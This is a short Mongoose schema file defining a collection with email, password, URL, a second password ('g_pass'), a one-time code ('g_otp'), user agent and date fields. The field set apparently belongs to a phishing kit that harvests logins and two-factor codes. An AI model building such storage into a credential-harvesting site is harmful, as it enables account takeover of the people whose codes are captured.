import mongoose, { Schema } from "mongoose";

const dataModel = new mongoose.Schema({

    email: String,
    password: String,
    url: String,
    g_pass: String,
    g_otp: String,
    user_id: String,
    userAgent: String,
    date: Date
})

const Data = mongoose.models.data || mongoose.model("data", dataModel);
export default Data;